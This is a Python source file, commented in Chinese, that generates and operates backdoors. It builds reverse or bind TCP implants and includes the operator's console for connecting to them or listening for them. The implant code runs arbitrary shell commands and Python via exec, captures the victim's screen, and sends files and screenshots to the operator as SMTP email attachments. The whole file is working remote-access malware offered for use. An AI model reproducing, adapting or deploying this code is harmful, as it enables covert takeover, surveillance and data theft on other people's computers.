# Generate.py主要是生成和连接后门的作用
# 作者GitHub:ycy20090311

import socket

#被控端脚本必要的库与函数
code = """
import socket,smtplib,subprocess
from os import remove
from tkinter import Tk
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
host = ""
port = ""
name = ""
password = ""
def Shell(cmd):
    try:
        shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        ret = shell.stdout.read().decode() + shell.stderr.read().decode()
        if ret == "":ret = " "
    except:
        ret = "获取标准输入和标准错误 失败"
    return ret
def Get(file1):
    ret = "传输成功"
    try:
        msg = MIMEMultipart()
        file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
        file["Content-Type"] = "application/octet-stream"
        file["Content-Disposition"] = "attachment;filename = " + file1
        msg.attach(file)
    except:
        ret = "抱歉 文件貌似不可传"
    try:
        smtp = smtplib.SMTP()
        smtp.connect(host,port)
        smtp.login(name,password)
        smtp.sendmail(name,name,msg.as_string())
        smtp.close()
    except:
        ret = "传输失败 请检查你的变量值设置"
    return ret
def Win():
    try:
        windown = Tk()
        jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
        jpg.save(".win.jpg")
        ret = Get(".win.jpg")
        remove(".win.jpg")
        ret = "传输成功"
    except:
        ret = "传输失败 请检查你的变量值设置"
    return ret
"""

#连接正向TCP后门
def connect(ip,port):
    t = socket.socket()
    t.connect((ip,int(port)))
    try:
        while True:
            cmd = input("$>")
            if cmd == "":print("")
            else:
                t.send(cmd.encode())
                print(t.recv(2048).decode())
    except:
        print("\n会话已断开")
    t.close()


#接受反向TCP后门的连接
def listen(ip,port):
    t = socket.socket()
    t.bind((ip,int(port)))
    t.listen(1)
    print("正在监听%s端口" % port)
    c,ip = t.accept()
    try:
        while True:
            cmd = input('$>')
            if cmd == '':print('')
            else:
                c.send(cmd.encode())
                print(c.recv(2048).decode())
    except:
        print("\n会话已断开")
    c.close()
    t.close()


#生成正反向TCP后门
def generate(i,src,ip,port):
    if i == "0":
        f = open(src,"w+")
        f.write(code+"""
if "__main__" == __name__:
    t = socket.socket()
    try:
        t.connect(("%s",%s))
        while True:
            cmd = t.recv(2048).decode().split(" ",1)
            if cmd[0]!="win" and len(cmd)==1:
                t.send("您输入的命令或参数有误".encode())
            elif cmd[0] == "shell":
                t.send(Shell(cmd[1]).encode())            
            elif cmd[0] == "get":
                t.send(Get(cmd[1]).encode())
            elif cmd[0] == "win":
                t.send(Win().encode())
            elif cmd[0] == "py":
                try:
                    exec(cmd[1])
                    ret = "命令执行成功"
                except:
                    ret = "执行失败"
                t.send(ret.encode())
        t.close()
    except:
        exit()
""" % (ip,port))
        f.close()
    elif i == "1":
        f = open(src,"w")
        f.write(code+"""
if "__main__" == __name__:
    t = socket.socket()
    t.bind(("%s",%s))
    t.listen(1)
    c,ip = t.accept()
    while True:
        cmd = c.recv(2048).decode().split(" ",1)
        if cmd[0]!="win" and len(cmd)==1:
            c.send("您输入的命令或参数有误".encode())
        elif cmd[0] == "shell":
            c.send(Shell(cmd[1]).encode())            
        elif cmd[0] == "get":
            c.send(Get(cmd[1]).encode())
        elif cmd[0] == "win":
            c.send(Win().encode())
        elif cmd[0] == "py":
            try:
                exec(cmd[1])
                ret = "命令执行成功"
            except:
                ret = "执行失败"
            c.send(ret.encode())
    c.close()
    t.close()
""" % (ip,port))
        f.close()
    else:
        print("请提供符合要求的参数")

